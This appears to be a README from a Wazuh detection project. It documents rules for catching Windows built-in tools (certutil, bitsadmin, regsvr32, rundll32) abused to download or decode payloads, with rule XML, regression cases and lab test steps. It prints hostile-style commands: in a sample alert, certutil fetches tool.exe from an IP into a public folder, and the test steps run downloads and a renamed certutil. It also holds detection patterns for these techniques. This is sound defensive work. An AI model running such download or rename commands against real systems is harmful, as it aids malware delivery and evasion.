[All use cases](../../README.md#the-use-cases) · Previous: [UC11](../UC11-powershell-abuse/README.md) · Next: [UC13](../UC13-registry-run-keys/README.md)

# UC12: Built-in Windows tools used as downloaders (LOLBins)

| | |
|---|---|
| **Tactic** | Command and Control / Defense Evasion |
| **ATT&CK** | [T1036.003](https://attack.mitre.org/techniques/T1036/003/) Rename System Utilities, [T1105](https://attack.mitre.org/techniques/T1105/) Ingress Tool Transfer, [T1140](https://attack.mitre.org/techniques/T1140/) Deobfuscate/Decode Files, [T1197](https://attack.mitre.org/techniques/T1197/) BITS Jobs, [T1218.010](https://attack.mitre.org/techniques/T1218/010/) Regsvr32, [T1218.011](https://attack.mitre.org/techniques/T1218/011/) Rundll32 |
| **Runs on** | Windows 10 VM |
| **Top rule** | 111202 (level 13) |
| **Rules** | [`wazuh/rules/pp-120-uc12_lolbin_download_rules.xml`](../../wazuh/rules/pp-120-uc12_lolbin_download_rules.xml) |
| **Regression cases** | [`tests/cases/uc12.json`](../../tests/cases/uc12.json) |

## Why it matters

Attackers avoid bringing tools that antivirus knows; they use the ones Microsoft ships (certutil, bitsadmin, regsvr32, rundll32) to fetch and unpack the next stage. In an agency network these tools have almost no daily business use, so their abuse syntax is a strong signal.

## Log source

| Source | Where it is collected | Decoder |
|---|---|---|
| Sysmon process creation (event 1) | `Microsoft-Windows-Sysmon/Operational` on the Windows 10 VM (config `windows/pilgrim-sysmon.xml`) | Built-in `windows_eventchannel` |

## Detection logic

- 111201: certutil `-urlcache` / `-verifyctl` with a URL, any file type. Wazuh's 92075 only knows .exe/.dll.
- 111202: certutil `-decode` / `-decodehex`, any output. Wazuh's 92018 only knows output to .exe.
- 111203: bitsadmin `/transfer`, `/addfile`, `/download`. 111204: regsvr32 loading a remote scriptlet (Squiblydoo). 111205: rundll32 running JavaScript or a URL.
- 111206: one of these tools (or PowerShell) running under another file name. Tools are matched by `OriginalFileName` from the PE header, so renaming certutil.exe does not hide it.
- 111201/111202/111206 are also children of Wazuh's 92075, 92018, 92016, 92017 and 92051. Whichever rule the event reaches first, the final alert is the UC12 one.

### Rules (6 alerting, 0 supporting)

| Rule | Level | Description | ATT&CK |
|---|---|---|---|
| 111201 | 12 | UC12 certutil downloaded a file from a URL on `$(win.system.computer)`: `$(win.eventdata.commandLine)` | T1105 |
| 111202 | 13 | UC12 certutil decoded an encoded file on `$(win.system.computer)`: `$(win.eventdata.commandLine)` | T1140 |
| 111203 | 10 | UC12 bitsadmin download job created on `$(win.system.computer)`: `$(win.eventdata.commandLine)` | T1105, T1197 |
| 111204 | 13 | UC12 regsvr32 loaded a remote scriptlet on `$(win.system.computer)`: `$(win.eventdata.commandLine)` | T1218.010 |
| 111205 | 13 | UC12 rundll32 executed script or a URL on `$(win.system.computer)`: `$(win.eventdata.commandLine)` | T1218.011 |
| 111206 | 13 | UC12 renamed system tool on `$(win.system.computer)`: `$(win.eventdata.image)` is really `$(win.eventdata.originalFileName)` - `$(win.eventdata.commandLine)` | T1036.003 |

<details>
<summary>Rule XML</summary>

```xml
<rule id="111201" level="12">
  <if_sid>92075, 61603, 92025, 92028, 92042, 92069</if_sid>
  <field name="win.eventdata.originalFileName" type="pcre2">(?i)^certutil\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)[-/](urlcache|verifyctl)\b.*https?://</field>
  <description>UC12 certutil downloaded a file from a URL on $(win.system.computer): $(win.eventdata.commandLine)</description>
  <mitre>
    <id>T1105</id>
  </mitre>
  <group>pp_lolbin,pp_execution,</group>
</rule>

<rule id="111202" level="13">
  <if_sid>92018, 61603, 92025, 92028, 92042, 92069</if_sid>
  <field name="win.eventdata.originalFileName" type="pcre2">(?i)^certutil\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)[-/]decode(hex)?\s</field>
  <description>UC12 certutil decoded an encoded file on $(win.system.computer): $(win.eventdata.commandLine)</description>
  <mitre>
    <id>T1140</id>
  </mitre>
  <group>pp_lolbin,pp_execution,</group>
</rule>

<rule id="111203" level="10">
  <if_sid>61603, 92025, 92028, 92042, 92069</if_sid>
  <field name="win.eventdata.originalFileName" type="pcre2">(?i)^bitsadmin\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)/(transfer|addfile|download)\b</field>
  <description>UC12 bitsadmin download job created on $(win.system.computer): $(win.eventdata.commandLine)</description>
  <mitre>
    <id>T1105</id>
    <id>T1197</id>
  </mitre>
  <group>pp_lolbin,pp_execution,</group>
</rule>

<rule id="111204" level="13">
  <if_sid>61603, 92025, 92028, 92042, 92069</if_sid>
  <field name="win.eventdata.originalFileName" type="pcre2">(?i)^regsvr32\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)/i:\s*https?://|scrobj\.dll</field>
  <description>UC12 regsvr32 loaded a remote scriptlet on $(win.system.computer): $(win.eventdata.commandLine)</description>
  <mitre>
    <id>T1218.010</id>
  </mitre>
  <group>pp_lolbin,pp_execution,</group>
</rule>

<rule id="111205" level="13">
  <if_sid>61603, 92025, 92028, 92042, 92069</if_sid>
  <field name="win.eventdata.originalFileName" type="pcre2">(?i)^rundll32\.exe$</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)javascript:|https?://</field>
  <description>UC12 rundll32 executed script or a URL on $(win.system.computer): $(win.eventdata.commandLine)</description>
  <mitre>
    <id>T1218.011</id>
  </mitre>
  <group>pp_lolbin,pp_execution,</group>
</rule>

<rule id="111206" level="13">
  <if_sid>92016, 92017, 92051, 61603, 92025, 92028, 92042, 92069</if_sid>
  <field name="win.eventdata.originalFileName" type="pcre2">(?i)^(certutil|bitsadmin|regsvr32|rundll32|mshta|wscript|cscript|powershell)\.exe$</field>
  <field name="win.eventdata.image" type="pcre2" negate="yes">(?i)\\(certutil|bitsadmin|regsvr32|rundll32|mshta|wscript|cscript|powershell)\.exe$</field>
  <description>UC12 renamed system tool on $(win.system.computer): $(win.eventdata.image) is really $(win.eventdata.originalFileName) - $(win.eventdata.commandLine)</description>
  <mitre>
    <id>T1036.003</id>
  </mitre>
  <group>pp_lolbin,pp_execution,</group>
</rule>
```

</details>

## Example alerts

Real output from the Wazuh analysis engine, produced by replaying this use case's regression cases (taken from [`demo/sample-alerts.ndjson`](../../demo/sample-alerts.ndjson)).

**111201, level 12:** UC12 certutil downloaded a file from a URL on WIN10-LAB: certutil.exe -urlcache -split -f http://198.51.100.9/tool.exe C:\\Users\\Public\\tool.exe

```
{"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "channel": "Microsoft-Windows-Sysmon/Operational", "level": "4", "computer": "WIN10-LAB", "eventID": "1"}, "eventdata": {"ruleName": "-", "utcTime": "2026-11-11 10:00:00.000", "processGuid": "{11111111-2222-3333-4444-555555555555}", "processId": "4242", "image": "C:\\\\Windows\\\\System32\\\\certutil.exe", "fileVersion": "10.0.19041.1", "description": "-", "product": "Microsoft Windows Operating System", "company": "Microsoft Corporation", "originalFileName": "CertUtil.exe", "commandLine": "certutil.exe -urlcache -split -f http://198.51.100.9/tool.exe C:\\\\Users\\\\Public\\\\tool.exe", "currentDirectory": "C:\\\\Users\\\\ahmed\\\\", "user": "WIN10-LAB\\\\ahmed", "logonGuid": "{11111111-2222-3333-4444-000000000001}", "logonId": "0x3e7a1", "terminalSessionId": "1", "integrityLevel": "Medium", "hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "parentProcessGuid": "{11111111-2222-3333-4444-555555555554}", "parentProcessId": "4100", "parentImage": "C:\\\\Windows\\\\explorer.exe", "parentCommandLine": "C:\\\\Windows\\\\explorer.exe", "parentUser": "WIN10-LAB\\\\ahmed"}}}
```

## How to test it live

Runs on: Windows 10 VM.

1. On the Windows VM: `certutil -urlcache -split -f http://127.0.0.1/none.txt C:\Users\Public\none.txt` gives 111201 (the download fails; Defender may also block it, which is a bonus alert).
2. `copy C:\Windows\System32\certutil.exe C:\Users\Public\cu.exe` then `C:\Users\Public\cu.exe -?` gives 111206. Delete `cu.exe` afterwards.
3. `bitsadmin /transfer pplab /download /priority normal http://127.0.0.1/none.txt C:\Users\Public\none.txt` gives 111203.

The full lab procedure is in [`docs/live-test-runbook.md`](../../docs/live-test-runbook.md).

## False-positive control

- Each rule targets abuse syntax, not the tool: `certutil -dump` or `certutil -hashfile` stay quiet (cases UC12-09/10).
- Software that ships a renamed copy of a Microsoft tool is extremely rare; allowlist it by path if it appears.

## Regression cases

11 cases (9 positive, 2 negative) in [`tests/cases/uc12.json`](../../tests/cases/uc12.json), all passing in the [engine report](../../tests/lab-engine-report.md).

| Case | Kind | What it checks |
|---|---|---|
| UC12-01 | positive | certutil downloads an EXE (Wazuh 92075 matches first, UC12 child wins) -> 111201 |
| UC12-02 | positive | certutil downloads a PowerShell script (gap in Wazuh 92075) -> 111201 |
| UC12-03 | positive | certutil decodes base64 into an EXE (Wazuh 92018 matches first, UC12 child wins) -> 111202 |
| UC12-04 | positive | certutil -decodehex into a DLL (gap in Wazuh 92018) -> 111202 |
| UC12-05 | positive | bitsadmin transfer job -> 111203 |
| UC12-06 | positive | regsvr32 loads a remote scriptlet -> 111204 |
| UC12-07 | positive | rundll32 opens a URL -> 111205 |
| UC12-08 | positive | certutil copied to Users\Public under another name -> 111206 |
| UC12-09 | negative | certutil dumping a certificate (no alert) |
| UC12-10 | negative | admin checks a file hash with certutil (no alert) |
| UC12-11 | positive | renamed certutil decodes into an EXE (Wazuh 92016 -> 92017 path) -> 111206 |

## How to improve it

- Correlate a LOLBin download with a new process started from the downloaded path within 5 minutes.
- Add Sysmon event 3 (network connection) for these tools to see the destination IP.

---

_Rifadah Pilgrim Services is a fictional organisation. Every name, account, address and document in these examples is synthetic._
